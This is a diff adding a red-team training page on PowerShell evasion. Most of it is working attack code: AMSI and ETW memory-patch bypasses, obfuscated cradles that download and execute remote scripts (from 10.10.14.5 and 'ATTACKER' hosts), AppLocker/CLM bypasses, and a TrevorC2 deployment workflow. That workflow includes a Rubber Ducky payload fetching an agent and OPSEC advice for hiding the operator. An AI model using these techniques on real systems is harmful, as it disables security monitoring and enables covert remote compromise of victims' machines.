@@ -1,0 +1,452 @@
+---
+layout: training-page
+title: "PowerShell Evasion Techniques — Red Team Academy"
+module: "Tool Development"
+tags:
+  - powershell
+  - evasion
+  - amsi-bypass
+  - etw-bypass
+  - reflection
+  - obfuscation
+page_key: "tooldev-ps-evasion"
+render_with_liquid: false
+---
+
+# PowerShell Evasion Techniques
+
+## Overview
+
+Modern PowerShell defences include AMSI (Antimalware Scan Interface), Script Block Logging, Module Logging, Transcription Logging, Constrained Language Mode (CLM), and ETW (Event Tracing for Windows). This module covers techniques to bypass each layer using reflection, memory patching, and language-level obfuscation. Understanding these bypasses is essential for both red team operators and defenders building detection rules.
+
+## AMSI Bypass via .NET Reflection (Patching amsiInitFailed)
+
+AMSI initialisation is tracked by a private static field `amsiInitFailed` in the `System.Management.Automation.AmsiUtils` class. Setting this field to `$true` causes AMSI to report that initialisation failed and skip all subsequent scans. This works in PowerShell 5.x without requiring admin rights.
+
+```
+# Method 1: Set amsiInitFailed via reflection.
+# Note: This specific bypass is now detected by most AV/EDR products.
+# It is shown here for educational purposes — understand what is being patched.
+
+# Access the internal AmsiUtils type (non-public, requires reflection)
+$amsiType = [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils")
+
+# Get the amsiInitFailed field — it is NonPublic and Static
+$field = $amsiType.GetField("amsiInitFailed",
+    [Reflection.BindingFlags]"NonPublic,Static")
+
+# Set the field to $true — AMSI reports it failed to initialise and stops scanning
+$field.SetValue($null, $true)
+
+Write-Host "[+] AMSI disabled via reflection (amsiInitFailed = true)"
+
+# ── Verify bypass is active ───────────────────────────────────────────────────
+# AMSI-test string (safe — this is a known test string, not real malware):
+# [System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory() — should work
+# amsiutils test string: "AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386"
+# After bypass, this string should NOT be flagged by AMSI
+```
+
+## AMSI Bypass via Memory Patch (AmsiScanBuffer)
+
+Patch the `AmsiScanBuffer` function in `amsi.dll` to immediately return `AMSI_RESULT_CLEAN` (0x80070057) or force an error return. This requires P/Invoke to modify process memory — works regardless of PowerShell version but requires the DLL to be loaded. More reliable than field patching across PS versions.
+
+```
+# Method 2: Patch AmsiScanBuffer in amsi.dll to return clean result.
+# The patch overwrites the first few bytes with a 'return 0' instruction sequence.
+
+$PatchCode = @'
+using System;
+using System.Runtime.InteropServices;
+
+public class AmsiPatch {
+    [DllImport("kernel32")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+    [DllImport("kernel32")]
+    public static extern IntPtr LoadLibrary(string name);
+
+    [DllImport("kernel32")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
+        uint flNewProtect, out uint lpflOldProtect);
+
+    public static void Patch() {
+        // Load amsi.dll (usually already loaded in the PowerShell process)
+        IntPtr lib = LoadLibrary("amsi.dll");
+        if (lib == IntPtr.Zero) throw new Exception("Could not load amsi.dll");
+
+        // Find the AmsiScanBuffer export
+        IntPtr func = GetProcAddress(lib, "AmsiScanBuffer");
+        if (func == IntPtr.Zero) throw new Exception("AmsiScanBuffer not found");
+
+        // x64 patch bytes: mov eax, 0x80070057 (E_INVALIDARG); ret
+        // This makes AmsiScanBuffer return an error code, causing the calling code
+        // to skip the scan (treated as AMSI_RESULT_CLEAN by PowerShell runtime)
+        byte[] patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
+        //                          ^^mov eax,                         ^^ret
+
+        // Make the memory region writable (change from PAGE_EXECUTE_READ to PAGE_EXECUTE_READWRITE)
+        uint oldProtect;
+        VirtualProtect(func, (UIntPtr)patch.Length, 0x40, out oldProtect);
+
+        // Write the patch bytes over the start of AmsiScanBuffer
+        Marshal.Copy(patch, 0, func, patch.Length);
+
+        // Restore original page protection (avoid leaving RWX pages)
+        VirtualProtect(func, (UIntPtr)patch.Length, oldProtect, out oldProtect);
+    }
+}
+'@
+
+Add-Type -TypeDefinition $PatchCode
+[AmsiPatch]::Patch()
+Write-Host "[+] AmsiScanBuffer patched — AMSI disabled for this session"
+```
+
+## ETW (Event Tracing for Windows) Bypass
+
+ETW is the telemetry layer used by Windows Defender, Microsoft Defender for Endpoint, and Sysmon to capture PowerShell events. Patching `EtwEventWrite` in `ntdll.dll` stops events from being published to ETW consumers — effectively silencing telemetry for the current process.
+
+```
+# ETW bypass: patch EtwEventWrite in ntdll.dll to return immediately.
+# This prevents PowerShell script block events from reaching ETW consumers.
+# Requires P/Invoke to modify process memory.
+
+$EtwCode = @'
+using System;
+using System.Runtime.InteropServices;
+
+public class EtwBypass {
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GetModuleHandle(string moduleName);
+
+    [DllImport("kernel32.dll")]
+    public static extern bool VirtualProtect(IntPtr addr, UIntPtr size,
+        uint newProtect, out uint oldProtect);
+
+    public static void Patch() {
+        // EtwEventWrite lives in ntdll.dll (always loaded)
+        IntPtr ntdll = GetModuleHandle("ntdll.dll");
+        IntPtr func  = GetProcAddress(ntdll, "EtwEventWrite");
+
+        // Patch: xor rax, rax (zero return value = SUCCESS); ret
+        // This makes every ETW event write appear to succeed while doing nothing
+        byte[] patch = new byte[] { 0x48, 0x33, 0xC0, 0xC3 };
+        //                        xor rax,rax    ret
+
+        uint old;
+        VirtualProtect(func, (UIntPtr)4, 0x40, out old);   // PAGE_EXECUTE_READWRITE
+        Marshal.Copy(patch, 0, func, patch.Length);
+        VirtualProtect(func, (UIntPtr)4, old, out old);    // restore
+    }
+}
+'@
+
+Add-Type -TypeDefinition $EtwCode
+[EtwBypass]::Patch()
+Write-Host "[+] EtwEventWrite patched — ETW events suppressed for this process"
+```
+
+## PowerShell String Obfuscation Techniques
+
+Static signature detection looks for known offensive strings. Obfuscation breaks these strings into fragments, uses alternate encoding, or invokes cmdlets via variable expansion and reflection. The following patterns are building blocks for generating detection-resistant scripts.
+
+```
+# ── String concatenation — breaks static signatures ──────────────────────────
+# 'IEX' → split across multiple variables:
+$a = "I"; $b = "E"; $c = "X"
+& ($a+$b+$c) (New-Object Net.WebClient).DownloadString("http://10.10.14.5/s.ps1")
+
+# ── Reverse string ────────────────────────────────────────────────────────────
+$rev = "noisserpxE-ekovnI"[-1..-($("noisserpxE-ekovnI".Length)) -join '']
+# Equivalent to: Invoke-Expression (reversed)
+
+# ── Backtick insertion — PS ignores backticks within strings ──────────────────
+# Backtick before non-special chars is a no-op in PowerShell:
+I`n`v`o`k`e`-`E`x`p`r`e`s`s`i`o`n "whoami"
+
+# ── Base64-encoded command (avoid logging the plaintext in CLSM) ──────────────
+$cmd = "whoami | Out-File C:\Windows\Temp\out.txt"
+$enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
+powershell.exe -EncodedCommand $enc
+
+# ── SecureString round-trip to obfuscate a string in memory ──────────────────
+# Stores the string as an encrypted SecureString, converts back at runtime:
+$ss  = ConvertTo-SecureString "IEX" -AsPlainText -Force
+$ptr = [Runtime.InteropServices.Marshal]::SecureStringToBSTR($ss)
+$iex = [Runtime.InteropServices.Marshal]::PtrToStringBSTR($ptr)
+& $iex (New-Object Net.WebClient).DownloadString("http://10.10.14.5/s.ps1")
+
+# ── Environment variable substitution ────────────────────────────────────────
+$env:COMSPEC    # = C:\Windows\System32\cmd.exe
+$env:PSModulePath   # contains paths to PS module dirs
+
+# Use an env var to store part of a command:
+$env:_TMP = "DownloadString"
+(New-Object Net.WebClient).$env:_TMP("http://10.10.14.5/s.ps1") | IEX
+
+# ── CHAR() encoding — build string from char codes ───────────────────────────
+# 'IEX' from char codes (73=I, 69=E, 88=X):
+$iex = [char]73 + [char]69 + [char]88
+& $iex "whoami"
+
+# ── Type accelerator obfuscation ──────────────────────────────────────────────
+# Use the full .NET type name instead of the PS alias to avoid keyword detection:
+# 'Net.WebClient' → [System.Net.WebClient]
+[Activator]::CreateInstance([Type]::GetType("System.Net.WebClient")).DownloadString("http://10.10.14.5/s.ps1") | IEX
+```
+
+## Constrained Language Mode (CLM) Bypass
+
+CLM is enforced by AppLocker or WDAC policies. It restricts .NET type access, Add-Type, and direct COM object creation. Several bypasses exist depending on the enforcement mechanism: InstallUtil, MSBuild, and PowerShell 2.0 downgrade (already covered in LOLBins).
+
+```
+# ── Detect if CLM is active ───────────────────────────────────────────────────
+$ExecutionContext.SessionState.LanguageMode
+# FullLanguage = unrestricted; ConstrainedLanguage = restricted
+
+# ── Bypass 1: PowerShell 2.0 downgrade (if .NET 2.0 is installed) ────────────
+# PS 2.0 predates CLM — it runs in FullLanguage mode regardless of AppLocker policy
+powershell.exe -version 2 -nop -ep bypass -c "..."
+
+# ── Bypass 2: Find writeable paths that are not covered by AppLocker ──────────
+# AppLocker default rules only cover %WINDIR% and %PROGRAMFILES%
+# Writeable paths outside these may allow script execution:
+$writeable = @(
+    "$env:TEMP",
+    "C:\ProgramData",
+    "C:\Users\$env:USERNAME\AppData"
+)
+# Copy powershell.exe to a user-writeable path and run from there:
+Copy-Item $env:WINDIR\System32\WindowsPowerShell\v1.0\powershell.exe $env:TEMP\update.exe
+& "$env:TEMP\update.exe" -nop -ep bypass -c "..."
+
+# ── Bypass 3: PowerShell runspaces in a compiled DLL ─────────────────────────
+# C# code running as a DLL can create a PowerShell runspace in FullLanguage mode
+# because the DLL is not subject to AppLocker script rules (only binaries matter)
+# See 'Invoke-MemoryAssembly' from the post-exploitation module
+
+# ── Bypass 4: MSBuild inline C# task (covered in LOLBins Advanced) ───────────
+# MSBuild compiles and executes C# inline — bypasses AppLocker script rules
+
+# ── Bypass 5: JEA (Just Enough Administration) misconfiguration ───────────────
+# If JEA endpoints expose cmdlets that can be chained for RCE:
+Get-PSSessionConfiguration | Where-Object { $_.LanguageMode -ne "NoLanguage" }
+```
+
+## TrevorC2 — Covert C2 via Website Screenshots
+
+TrevorC2 is a covert command-and-control framework that hides C2 traffic inside legitimate-looking website screenshot data. The server hosts a normal-looking webpage; implants retrieve the page and decode commands steganographically embedded in the content. This makes C2 traffic blend with ordinary web browsing, evading proxy and DLP tools that inspect HTTP/S content for known C2 patterns.
+
+```
+# TrevorC2 architecture:
+# - Server: Python Flask app that serves a webpage; commands are embedded in the page content
+# - Client: PowerShell agent (agent.ps1) that polls the server URL at an interval,
+#           extracts the hidden command from the page, executes it, and returns output
+#           encoded as a second request that looks like a normal page visit
+# - Channel: plain HTTPS to a legitimate-looking domain — no custom protocol or unusual ports
+
+# Project: github.com/trustedsec/trevorc2
+```
+
+## Trevorfuscation — Automated PowerShell Obfuscation Workflow
+
+Trevorfuscation is a shell script that automates cloning TrevorC2, installing PyFuscation (a Python-based PowerShell obfuscator), and obfuscating the TrevorC2 PowerShell agent before deployment. PyFuscation replaces function names, variables, and parameters with randomised names, breaking static signatures that EDR products use to flag the known agent.
+
+### Setup & Usage
+
+```
+# Clone Trevorfuscation:
+git clone https://github.com/mikesmullin/Trevorfuscation
+cd Trevorfuscation
+
+# The script presents a 3-option menu:
+bash trevorfuscation.sh
+
+# Menu options:
+# 1) Download TrevorC2 + PyFuscation
+#    → git clone https://github.com/trustedsec/trevorc2
+#    → git clone https://github.com/CBHue/PyFuscation
+#
+# 2) Install requirements
+#    → pip3 install -r trevorc2/requirements.txt
+#    → pip3 install -r PyFuscation/requirements.txt
+#
+# 3) Obfuscate and start
+#    → runs: python3 PyFuscation/PyFuscation.py -fvp --ps trevorc2/agent.ps1
+#    → outputs: trevorc2/agent_obfuscated.ps1 (renamed functions/vars/params)
+#    → then starts the TrevorC2 server: python3 trevorc2/trevorc2_server.py
+```
+
+### PyFuscation — Standalone PowerShell Obfuscator
+
+```
+# PyFuscation can obfuscate any PowerShell script — not just TrevorC2.
+# Clone:
+git clone https://github.com/CBHue/PyFuscation
+cd PyFuscation
+pip3 install -r requirements.txt
+
+# Obfuscation flags:
+# -f   obfuscate function names
+# -v   obfuscate variable names
+# -p   obfuscate parameter names
+# --ps [script]  input PS1 file
+
+# Obfuscate your own payload:
+python3 PyFuscation.py -fvp --ps /path/to/payload.ps1
+# Output: /path/to/payload_obfuscated.ps1
+
+# The obfuscated script is functionally identical — all names replaced with
+# randomised strings (e.g., Invoke-Mimikatz → Invoke-aBcDeFgHiJ)
+# Each run produces different output, defeating static hash/signature detection
+```
+
+### Full Deployment Workflow
+
+```
+# 1. Configure TrevorC2 server (trevorc2/config.py):
+#    SITE_URL = "https://your-domain.com"       # where the agent polls
+#    LISTEN_PORT = 443
+#    POLL_INTERVAL = 60                          # seconds between check-ins
+
+# 2. Obfuscate the agent:
+cd Trevorfuscation
+bash trevorfuscation.sh    # option 1 (download), option 2 (install), option 3 (obfuscate)
+
+# 3. Deliver agent to target:
+#    - HID implant (O.MG Cable / Rubber Ducky):
+DELAY 1500
+GUI r
+DELAY 500
+STRINGLN powershell -w h -NoP -NonI -Exec Bypass -c "iex (iwr https://your-domain.com/agent.ps1)"
+
+#    - Phishing attachment / macro
+#    - File drop via exploit
+
+# 4. Issue commands from server:
+python3 trevorc2/trevorc2_server.py
+# Type commands at the prompt — they are served embedded in the webpage
+# Agent retrieves the page, decodes the command, executes, returns output
+
+# 5. OPSEC:
+#    - Serve TrevorC2 behind a CDN (Cloudflare) — operator IP hidden
+#    - Domain: register an aged domain with legitimate history
+#    - TLS: use a valid cert (Let's Encrypt) — traffic looks like HTTPS browsing
+#    - Poll interval: 60-300s avoids beaconing anomaly detection
+#    - Obfuscate agent each time before delivery — unique hash per target
+```
+
+## Invoke-Obfuscation
+
+Invoke-Obfuscation by Daniel Bohannon is the most comprehensive PowerShell obfuscation framework. It systematically applies token-level obfuscation, string encoding, and launch technique abstraction to any PowerShell command or script. Originally built to help blue teams enumerate detection coverage, it is widely used offensively to bypass AMSI signatures and EDR string matching.
+
+```
+# Install and launch:
+git clone https://github.com/danielbohannon/Invoke-Obfuscation
+cd Invoke-Obfuscation
+Import-Module .\Invoke-Obfuscation.psd1
+Invoke-Obfuscation
+
+# Or via CLI (non-interactive — scriptable):
+Import-Module .\Invoke-Obfuscation.psd1
+Invoke-Obfuscation -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/shell.ps1')} -Command 'Token\All\1,Encoding\1,Launcher\Stdin++\234,Clip' -Quiet -NoExit
+```
+
+### Obfuscation Categories
+
+```
+# TOKEN — Obfuscates individual PowerShell tokens (strings, members, variables, etc.)
+TOKEN\STRING\1      # string delimiters and concatenation
+TOKEN\STRING\2      # reordered string fragments
+TOKEN\MEMBER\1      # dot notation → & operator calls
+TOKEN\VARIABLE\1    # variable name randomization
+TOKEN\WHITESPACE\1  # insert random whitespace
+TOKEN\COMMENT\1     # insert inline comments
+TOKEN\ALL\1         # apply all token obfuscation layers
+
+# STRING — Obfuscates at the script string level
+STRING\1            # string reversal
+STRING\2            # PowerShell format operator (-f) reordering
+STRING\3            # ASCII char array concatenation
+
+# ENCODING — Encodes the full script
+ENCODING\1          # ASCII
+ENCODING\2          # hex encoding
+ENCODING\3          # octal encoding
+ENCODING\4          # binary encoding
+ENCODING\5          # SecureString (password encryption)
+ENCODING\6          # BXOR (XOR against random key)
+
+# LAUNCHER — Abstracts how PowerShell is launched (pushes cmd away from powershell.exe)
+LAUNCHER\PS\1       # standard powershell.exe with -EncodedCommand
+LAUNCHER\CLIP+\1    # uses clipboard — powershell reads from clipboard
+LAUNCHER\WMIC\1     # WMIC.exe launches PowerShell (parent = wmic.exe)
+LAUNCHER\MSHTA\1    # mshta.exe → JScript → launches PowerShell
+LAUNCHER\RUNDLL32   # rundll32.exe as parent
+LAUNCHER\REGASM     # regasm.exe as parent
+LAUNCHER\STDIN++    # pipe from stdin — no encoded command in cmdline
+```
+
+### Common Obfuscation Pipelines
+
+```
+# Interactive pipeline (in Invoke-Obfuscation console):
+# Set script block:
+SET SCRIPTBLOCK IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/payload.ps1')
+
+# Apply layered obfuscation:
+TOKEN\ALL\1         # token-level obfuscation
+STRING\3            # ASCII char array
+ENCODING\5          # SecureString encryption
+LAUNCHER\WMIC\1     # launch via wmic.exe
+
+# Copy result to clipboard: OUT or CLIP
+
+# CLI one-liner for automation:
+Invoke-Obfuscation -ScriptBlock {IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/shell.ps1')} \
+  -Command 'Token\All\1,String\3,Encoding\5,Launcher\Wmic\1' \
+  -Quiet
+
+# Regex-based multi-match (obfuscate ALL STRING and ENCODING variations):
+Invoke-Obfuscation -ScriptBlock {...} -Command 'Token\*\*,String\[13],Encoding\(1|5)' -Quiet
+
+# UNDO last obfuscation layer:
+UNDO
+```
+
+### Specific Techniques for Detection Bypass
+
+```
+# Script Block Logging bypass:
+# PSv2 doesn't support Script Block Logging — use Launcher\PS\2 (forces PSv2)
+LAUNCHER\PS\2
+
+# Constrained Language Mode evasion — use TOKEN obfuscation to avoid known CLM bypasses
+# CLM blocks: Add-Type, [System.Type]::GetType(), COM objects
+# Approach: obfuscate the bypass payload before CLM checks the string content
+
+# AMSI bypass via encoding:
+# AMSI scans the script block before execution
+# Encoding\5 (SecureString) decrypts in-memory — some AMSI versions miss this
+ENCODING\5
+
+# WMIC launcher — parent process evasion:
+# cmd.exe or wmic.exe spawns powershell.exe → avoids "powershell.exe spawned by
+# suspicious parent" detections
+LAUNCHER\WMIC\1
+
+# Process argument tree comparison (built-in to Invoke-Obfuscation):
+# After generating a launcher, Invoke-Obfuscation shows the full process tree
+# Use this to understand the parent/child relationship your payload creates
+```
+
+## Resources
+
+- Invoke-Obfuscation — `github.com/danielbohannon/Invoke-Obfuscation`
+- Daniel Bohannon's DerbyCon 6.0 talk — `github.com/danielbohannon/Invoke-Obfuscation/blob/master/README.md`
+- MITRE ATT&CK T1027.010 — Obfuscated Files or Information: Command Obfuscation — `attack.mitre.org/techniques/T1027/010/`
+- Revoke-Obfuscation (detection) — `github.com/danielbohannon/Revoke-Obfuscation`
